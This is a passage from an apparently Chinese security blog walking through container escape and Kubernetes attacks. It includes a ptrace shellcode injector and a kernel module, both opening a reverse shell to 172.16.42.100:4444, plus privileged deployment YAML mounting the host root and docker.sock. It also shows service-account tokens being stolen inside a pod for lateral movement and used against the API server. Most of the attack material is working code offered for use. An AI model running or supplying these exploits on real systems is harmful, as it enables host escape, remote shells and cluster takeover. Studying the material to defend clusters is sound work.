class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHELLCODE_SIZE 74</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *shellcode = </span><br><span class="line"><span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xb9\x02\x00\x11\x5c\xac\x10\x2a\x64\x51\x48\x89\xe6\x6a\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">inject_data</span> <span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">unsigned</span> <span class="keyword">char</span> *src, <span class="keyword">void</span> *dst, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span>      i;</span><br><span class="line">  <span class="keyword">uint32_t</span> *s = (<span class="keyword">uint32_t</span> *) src;</span><br><span class="line">  <span class="keyword">uint32_t</span> *d = (<span class="keyword">uint32_t</span> *) dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i+=<span class="number">4</span>, s++, d++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(POKETEXT):&quot;</span>);</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pid_t</span>                   target;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">  <span class="keyword">int</span>                     syscall;</span><br><span class="line">  <span class="keyword">long</span>                    dst;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span> (<span class="built_in">stderr</span>, <span class="string">&quot;Usage:\n\t%s pid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  target = atoi (argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Tracing process %d\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_ATTACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(ATTACH):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Waiting for process...\n&quot;</span>);</span><br><span class="line">  wait (<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Getting Registers\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_GETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Inject code into current RPI position */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Injecting shell code at %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line">  inject_data (target, shellcode, (<span class="keyword">void</span>*)regs.rip, SHELLCODE_SIZE);</span><br><span class="line"></span><br><span class="line">  regs.rip += <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Setting instruction pointer to %p\n&quot;</span>, (<span class="keyword">void</span>*)regs.rip);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_SETREGS, target, <span class="literal">NULL</span>, &amp;regs)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      perror (<span class="string">&quot;ptrace(GETREGS):&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">printf</span> (<span class="string">&quot;+ Run it!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((ptrace (PTRACE_DETACH, target, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  perror (<span class="string">&quot;ptrace(DETACH):&quot;</span>);</span><br><span class="line">	  <span class="built_in">exit</span> (<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译代码:</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">gcc infect.<span class="keyword">c</span> -o infect</span><br></pre></td></tr></table></figure>



<h3 id="SYS-MODULE逃逸"><a href="#SYS-MODULE逃逸" class="headerlink" title="SYS_MODULE逃逸"></a>SYS_MODULE逃逸</h3><p>将下面两个文件放在moduleEXP文件夹，编译后移动到容器， 这里也需要提前知道反弹地址</p>
<ul>
<li>exp.c (<font color=red>名字必须是exp.c</font>)</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span> <span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span> <span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span> <span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/nsproxy.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/proc_ns.h&gt;</span></span></span><br><span class="line"><span class="comment">///&lt; The license type -- this affects runtime behavior</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="comment">///&lt; The author -- visible when you use modinfo</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Nimrod Stoler&quot;</span>);</span><br><span class="line"><span class="comment">///&lt; The description -- see modinfo</span></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;NS Escape LKM&quot;</span>);</span><br><span class="line"><span class="comment">///&lt; The version of the module</span></span><br><span class="line">MODULE_VERSION(<span class="string">&quot;0.1&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">escape_start</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line">        <span class="string">&quot;SHELL=/bin/bash&quot;</span>,</span><br><span class="line">        <span class="string">&quot;HOME=/home/cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;USER=cyberark&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;DISPLAY=:0&quot;</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">char</span> *argv[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    rc = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_PROC);</span><br><span class="line">    printk(<span class="string">&quot;RC is: %i \n&quot;</span>, rc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">escape_end</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_EMERG <span class="string">&quot;Goodbye!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(escape_start);</span><br><span class="line">module_exit(escape_end);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>Makefile</p>
<p><font color="red">这里是tab，不能用空格替代tab</font></p>
</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">    obj-m :=exp.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    KDIR :=/lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>



<h2 id="镜像上传"><a href="#镜像上传" class="headerlink" title="镜像上传"></a>镜像上传</h2><h3 id="镜像导出导入"><a href="#镜像导出导入" class="headerlink" title="镜像导出导入"></a>镜像导出导入</h3><p>将我们的镜像导出</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">导出镜像</span><br><span class="line"><span class="symbol">docker</span> save -o mytomcat.tar mytomcat:<span class="built_in">v1</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>将保存的镜像导入到要上传的服务器</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">导入镜像</span><br><span class="line">docker load -<span class="selector-tag">i</span> mytomcat<span class="selector-class">.tar</span></span><br></pre></td></tr></table></figure>

<p>执行docker images就可以看见镜像导入了</p>
<h3 id="镜像仓库认证"><a href="#镜像仓库认证" class="headerlink" title="镜像仓库认证"></a>镜像仓库认证</h3><p>登录仓库，如果是私有镜像需要添加如下的配置，防止<code>x509: certificate signed by unknown authority</code>错误</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#vi</span> /etc/docker/daemon<span class="selector-class">.json</span></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">   <span class="string">&quot;insecure-registries&quot;</span>:<span class="selector-attr">[<span class="string">&quot;&quot;</span>]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改后重启docker，然后使用如下命令登录Registry</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">login</span> <span class="comment">--username=xxx hub.xxx.com</span></span><br></pre></td></tr></table></figure>



<h3 id="推送镜像"><a href="#推送镜像" class="headerlink" title="推送镜像"></a>推送镜像</h3><p>push镜像</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">docker <span class="keyword">tag</span> mytomca<span class="variable">t:v1</span>.<span class="number">0</span> hub.xxx.<span class="keyword">com</span>/user/sectes<span class="variable">t:v1</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line">docker push hub.xxx.<span class="keyword">com</span>/user/sectes<span class="variable">t:v1</span></span><br></pre></td></tr></table></figure>





<h2 id="集群运行"><a href="#集群运行" class="headerlink" title="集群运行"></a>集群运行</h2><h3 id="挂载危险目录以及开启特权"><a href="#挂载危险目录以及开启特权" class="headerlink" title="挂载危险目录以及开启特权"></a>挂载危险目录以及开启特权</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">xxx</span></span><br><span class="line"><span class="comment">#k8s是放在metada下面，测试的集群需要是单独一行</span></span><br><span class="line"><span class="comment">#  labels:</span></span><br><span class="line"><span class="comment">#    caas_service: xxx</span></span><br><span class="line"><span class="attr">labels:</span></span><br><span class="line">  <span class="attr">caas_service:</span> <span class="string">xxx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">xxx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">xxx</span></span><br><span class="line">        <span class="attr">caas_service:</span> <span class="string">xxx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">xxx</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">hub.xxx.com/user/xxx:v1</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">          <span class="attr">securityContext:</span></span><br><span class="line">            <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">args:</span> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/root/shell.sh&quot;</span>]</span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/host/rootfs</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dockersock</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/var/run/docker.sock</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dockerbin</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/usr/bin/docker</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">proc</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/host/proc</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dockersock</span></span><br><span class="line">          <span class="attr">hostPath:</span> </span><br><span class="line">          	<span class="attr">path:</span> <span class="string">/var/run/docker.sock</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dockerbin</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/usr/bin/docker</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">proc</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/proc</span></span><br></pre></td></tr></table></figure>



<h3 id="开启各种Capabilities"><a href="#开启各种Capabilities" class="headerlink" title="开启各种Capabilities"></a>开启各种Capabilities</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">xxx</span></span><br><span class="line"><span class="comment">#k8s是放在metada下面，测试的集群需要是单独一行</span></span><br><span class="line"><span class="comment">#  labels:</span></span><br><span class="line"><span class="comment">#    caas_service: xxx</span></span><br><span class="line"><span class="attr">labels:</span></span><br><span class="line">  <span class="attr">caas_service:</span> <span class="string">xxx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">xxx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">xxx</span></span><br><span class="line">        <span class="attr">caas_service:</span> <span class="string">xxx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">xxx</span></span><br><span class="line">          <span class="attr">image:</span> <span class="string">hub.xxx.com/user/xxx:v1</span></span><br><span class="line">          <span class="attr">imagePullPolicy:</span> <span class="string">IfNotPresent</span></span><br><span class="line">          <span class="attr">securityContext:</span></span><br><span class="line">            <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">            <span class="attr">capabilities:</span></span><br><span class="line">              <span class="attr">add:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">SYS_ADMIN</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">SYS_PTRACE</span></span><br><span class="line">              <span class="bullet">-</span> <span class="string">SYS_MODULE</span></span><br><span class="line">          <span class="attr">volumeMounts:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/host/rootfs</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dockersock</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/var/run/docker.sock</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dockerbin</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/usr/bin/docker</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">proc</span></span><br><span class="line">              <span class="attr">mountPath:</span> <span class="string">/host/proc</span></span><br><span class="line">      <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">rootfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dockersock</span></span><br><span class="line">          <span class="attr">hostPath:</span> </span><br><span class="line">          	<span class="attr">path:</span> <span class="string">/var/run/docker.sock</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">dockerbin</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/usr/bin/docker</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">proc</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/proc</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>云原生安全</tag>
      </tags>
  </entry>
  <entry>
    <title>容器编排平台-Kubernetes安全</title>
    <url>/%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92%E5%B9%B3%E5%8F%B0-Kubernetes%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<blockquote>
<p>有之以为利，无之以为用。</p>
</blockquote>
<p>Kubernetes安全问题总结。</p>
<span id="more"></span>

<p>Kubernetes是容器编排平台的事实标准，具有较高的复杂性，使用到各种组件，但是组件和本身都可能存在漏洞。下面列举一下Kubernetes使用的组件常见开放端口</p>
<table>
<thead>
<tr>
<th>组件</th>
<th>默认端口</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>API Server</td>
<td>6443</td>
<td>基于HTTPS的安全端口</td>
</tr>
<tr>
<td>API Server</td>
<td>8080</td>
<td>不安全的HTTP端口，不建议启用</td>
</tr>
<tr>
<td>Kubelet</td>
<td>10248</td>
<td>用于检查Kubelet健康状态的HTTP端口</td>
</tr>
<tr>
<td>Dashboard</td>
<td>8001</td>
<td>提供HTTP服务的端口</td>
</tr>
<tr>
<td>etcd</td>
<td>2379</td>
<td>客户端与服务端通信的端口</td>
</tr>
<tr>
<td>etcd</td>
<td>2380</td>
<td>不同服务端实例之间通信的端口</td>
</tr>
</tbody></table>
<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h2><h3 id="1-1-pod内获K8s-Server-Token"><a href="#1-1-pod内获K8s-Server-Token" class="headerlink" title="1.1 pod内获K8s Server Token"></a>1.1 pod内获K8s Server Token</h3><blockquote>
<p>在Pod内收集token用于横向移动</p>
</blockquote>
<ul>
<li><p>命令：cat /var/run/secrets/kubernetes.io/serviceaccount/token</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl exec -it alpine-test /bin/sh</span></span><br><span class="line">kubectl <span class="built_in">exec</span> [POD] [COMMAND] is DEPRECATED and will be removed <span class="keyword">in</span> a future version. Use kubectl <span class="built_in">exec</span> [POD] -- [COMMAND] instead.</span><br><span class="line">/ <span class="comment"># cat /var/run/secrets/kubernetes.io/serviceaccount/token</span></span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjcyMjgzODA2LCJpYXQiOjE2NDA3NDc4MDYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJhbHBpbmUtdGVzdCIsInVpZCI6IjNmZmY0NGUxLTEzNzUtNGViYi04MzBlLTA3Yjk3MTFlOTE0MyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyJ9LCJ3YXJuYWZ0ZXIiOjE2NDA3NTE0MTN9LCJuYmYiOjE2NDA3NDc4MDYsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.ncqAGaslig7ut0aSxBpzg6QldCvAOt5E8i-2rB_zf8cq_Yku6n8C0nFvtiR9KzTu9OxWOjjyn7sKr8Q1xAN-S9xHwOxLG_hb-Z8gmz9VfxtM1hRE6h2JeLAZJgfRYjydrQns2JJ-3uZwKN15KNn95emZzTXMbpdhuFZyuiaOV-6q0jHsI9LhOzYczfJQhMUMXDppQzs3WuI8VckIzgjx9BZM0vgwHaNf065ak4FYGKDVNOoYhbl-b6jwaPNz0SFq0r1SUCLKa6Kn5rpcXzdOG2H_r_lTJlfTJyyFKHEmHtiYE2W9dkAk0AgyaNlZmnlr8D0bTwRahnYJ9k2N0hb9ag/ <span class="comment">#</span></span><br><span class="line">/ <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>成功获取到了token</p>
<p>通过token进行访问API Server。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master manifests]<span class="comment"># curl -k --header &quot;Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjVlYkx2aWRndzBVbm42VHYzQmNXaXdjdkl4cGZyWDFFd3l0aFBJY3pxNEkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tN3h0czQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjcyMDA5NmMzLWMwZWEtNGYwMy04ODljLTZkNDUwYWI2MmQyYyIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.sSEmxeJ2XIwb95t50ehRGvTUEOOQjjdTK5ula6AtgPV4z7m7YzpPKDSeQSauLWul272j9SLYyuiWR6rnoC4NvAgxgsAbapraJcyDjv0DadWUfbTcjLUSNGGaSQMuOyrYPA_ahK6UuFS_kAOiXL71gPLjE6xUcm8T4-aAgszUSG78OrMDmDao9ZoS2iD0TOVWNsxfUFw712meB4t2C5cj5DhfrDKdGLlJ4HRs3E0EYyPkX8NizaeSjifT-_AxFL7_KrL6GM4nMM8AEWoSn3v1N4CyQkvU5Bb2xu4hyZGX6OAWkcFNoMC4jEfeIgWbj6MC0elhuGYVznyr65GKtcjG6w&quot; https://172.16.42.100:6443/api</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;kind&quot;</span>: <span class="string">&quot;APIVersions&quot;</span>,</span><br><span class="line">  <span class="string">&quot;versions&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;v1&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;serverAddressByClientCIDRs&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;clientCIDR&quot;</span>: <span class="string">&quot;0.0.0.0/0&quot;</span>,</span><br><span class="line">      <span class="string">&quot;serverAddress&quot;</span>: <span class="string">&quot;172.16.42.100:6443&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="1-2-kubectl-获取-Api-server-token"><a href="#1-2-kubectl-获取-Api-server-token" class="headerlink" title="1.2 kubectl 获取 Api server token"></a>1.2 kubectl 获取 Api server token</h3><ul>
<li><p>命令：kubectl config view</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@master ~]<span class="comment"># kubectl config view</span></span><br><span class="line">apiVersion: v1</span><br><span class="line">clusters:</span><br><span class="line">- cluster:</span><br><span class="line">    certificate-authority-data: DATA+OMITTED</span><br><span class="line">    server: https://172.16.42.100:6443</span><br><span class="line">  name: kubernetes</span><br><span class="line">contexts:</span><br><span class="line">- context:</span><br><span class="line">    cluster: kubernetes</span><br><span class="line">    user: kubernetes-admin</span><br><span class="line">  name: kubernetes-admin@kubernetes</span><br><span class="line">current-context: kubernetes-admin@kubernetes</span><br><span class="line">kind: Config</span><br><span class="line">preferences: &#123;&#125;</span><br><span class="line">users:</span><br><span class="line">- name: kubernetes-admin</span><br><span class="line">  user:</span><br><span class="line">    client-certificate-data: REDACTED</span><br><span class="line">    client-key-data: REDACTED</span><br><span class="line">[root@master ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>获取到Api Server地址：<a href="https://172.16.42.100:6443/">https://172.16.42.100:6443</a></p>
</li>
</ul>
<h3 id="1-3-kubectl-获取Api-Server-token"><a href="#1-3-kubectl-获取Api-Server-token" class="headerlink" title="1.3 kubectl 获取Api Server token"></a>1.3 kubectl 获取Api Server token</h3><ul>
<li><p>命令：kubectl describe secrets</p>
